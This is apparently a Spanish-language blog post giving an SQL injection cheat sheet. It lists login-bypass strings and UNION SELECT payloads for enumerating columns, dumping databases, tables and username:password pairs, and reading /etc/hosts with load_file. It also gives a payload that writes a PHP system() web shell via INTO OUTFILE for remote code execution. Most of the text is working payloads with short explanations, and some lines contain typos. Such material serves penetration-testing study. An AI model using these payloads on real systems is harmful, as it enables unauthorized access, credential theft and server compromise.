---
title: SQLInjection CheatSheet 
author:
date: 15-11-2023
categories: [Hacking Web, SQLInjection]
tags: [SQLI, ErrorBased]
pin: false
image:
  path: 
  alt: SQLI
---

## Login Bypass Authentication 
```
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin'-- -
```

compara el usuario con la contraseña 
' ---   -> cierra la sentencia de la query y no hace la comparación con la contraseña

## Comentario de query
**Haciendo cometario de la query** 
```
# or -- -
```

## Enumeración de columnas - basandonos en x columnas
```
'order by 100-- -

'order by 50-- -

'order by 30-- -

'order by 10-- - 

'order by 4-- -
```

Si en el output nos representa  un error o es diferente un codigo de respuesta basandonos a la cantidad de datos introducidos  podemos hacer un UNION SELECT basandonos de x columa encontrada 

## Aplicaicon en Union select 
Por ejemplo, si fueran 5 columnas:

```
'union select 1,2,3,4,5-- -

'union select 1,1,1,1,1-- -

'union select NULL,NULL,NULL,NULL,NULL-- -
```

## Error Based and Union select with finding a column contain text
Error Based - > nos aprovechamos basandonos al error de la Web del output 

dependiendo de el  output y del orden identificador del numero que pongamos podemos inyectar codigo para mandar mas querys, como por ejemplo cargar un load file interno de la máquina. Ejemplo agarrando la db de la anterior , si en el otput tenemos un identificador numerico 3 en la sentencia que mandamos, podemos inyectar mas querys y aplicar mas inyecciones sobre ese campo y si no representa un output tenemos que ir fuzzeando en cada uno de los datos para saber el campo inyectable 

```
'union select 1,2,@@version,4,5-- -

'union select version(),user,(),4,5-- -

'union select 1,2,load_file("/etc/hosts")4,5-- - 

***podemos inyectar codigo php si la página lo interpreta para poder cargar cosas o tener RCE***

'union select,1,2,<?php system("whoami") ?>",into outfile "/tmp/prueba.txt";- -

***si No tenemos ouput en la respuesta Fuzzeamos por cada uno hasta que nos representa la cadena inyectada, en este caso inyectaremos "test" 

'union select 'test',2,3,4,5-- - no devuelve el output de test, intentaremos el siguiente

'union sleect 1,'test',3,4,5-- - tampoco devuelve, el siguiente ahora

'union select 1,2,'test',4,5-- - si devuelve por lo tanto en este campo inyectaremos las querys 

```

obtener informacion sobre otras tablas, **Un schemaName representa un esquema** . Los esquemas contienen otros objetos de diccionario, como tablas e índices. Los esquemas proporcionan una forma de nombrar un subconjunto de tablas y otros objetos de diccionario dentro de una base de datos. 

## Nombre de las bases de datos existentes (Listar DBs)

```
'union select 1,2,schema_name,4,5 from information_schema.schemata-- -

***podemos hacer que no lo ponga en un unico campo jugando con group concat para que nos volque toda la informacion posibles***

'union select 1,2group_concat(schema_name),4,5 from information_schema.schemata-- -

o poemos limitar de uno a uno

'union select 1,2,schema_name,4,5 from information_schema.schemata limit 1,2-- -

'union select 1,2,schema_name,4,5 from information_schema.schemata limit 2-- -
```

Una vez que conocemos las tablas vamos a hacer ejecucion de querys para ver las tablas existentes y supongamos que hay una tabla llamada users

## Ver tablas existentes - Dump Tables

```
'union select 1,2,table_name,4,5 from information_schema.tables-- -

***Especificar la base de datos en concreto añadiendo un where para ver la tabla users***

'union select 1,2,table_name,4,5 from information_schema.tables where table_schema='users'

```

## Ver columnas - Dump Tables
el proceso es parecido solo que añadiendo primeramente nuestra base de datos a dumpear, seguido de el nombre de la tabla a la cual queremos tener y acceder a la informacion 

```
'union select 1,2,column_name,4,5 from information_schema.columns where table_schema = 'DB' and table_name = 'tabla'

***Ejemplo con una Base de datos llamada public y la tabla llamada users***

'union select 1,2,column_name,4,5 from information_schema.columns where table_schema = 'public' and table_name='users'

'union select 1,2,group_concat(columna name),4,5 from information_schema.columns where table_schema='users'
```

## Dump Data Extract Information 

```
'union select NULL,group_concat(username,':',password) from users-- -

'union select 1,2,group_concat(username,':',password),4,5 from users-- -

'union select 1,2,concat(username,':',password),4,5 from users-- -

***En el caso de que no te deje representar los dos puntos los ponemos en hexadecimal***

'union select 1,2,group_concat(username,0x3a,password),4,5 from users-- -

***Representar una cadena exacta indicandole en hexadecimal el usuario o una query en especifica***

'union select 1,2,password,4,5 from users where username='admin'-- - 

'union select 1,2,password,4,5 from users where username='61646d696e'-- -
```

## String concatenation
multiples forma de hacer una concatenacion si es que  no te deja

https://portswigger.net/web-security/sql-injection/cheat-sheet

```
Oracle

`'foo'||'bar'`

Microsoft

`'foo'+'bar'`

PostgreSQL

`'foo'||'bar'`

MySQL

`'foo' 'bar'` [Note the space between the two strings]  
`CONCAT('foo','bar')`

***Agarrando con los ejmeplos anteriores aplicaremos una concatenacion***

'union select 1,2,username||':'||password,4,5 from users;-- -
```

## SQL Injection attack, querying the database type and version on Oracle

La tabla DUAL es una **tabla especial de una sola columna presente de manera predeterminada en todas las instalaciones de bases de datos de Oracle**. Se utiliza para seleccionar una seudocolumna como SYSDATE o USER. La tabla tiene una sola columna VARCHAR2(1) llamada DUMMY que tiene un valor de 'X'.
La sintaxis [SQL](https://es.wikipedia.org/wiki/SQL "SQL") de Oracle requiere la cláusula FROM pero algunas consultas no requieren ninguna tabla; DUAL puede ser utilizada en estos casos.

```
SELECT 1+1
FROM DUAL;

SELECT 1 
FROM DUAL;

SELECT USER 
FROM DUAL;

SELECT SYSDATE
FROM DUAL;

'union select 1,2,3,4,5 from dual-- -

'union select 1,2,banner,4,5 from v$version-- -

```



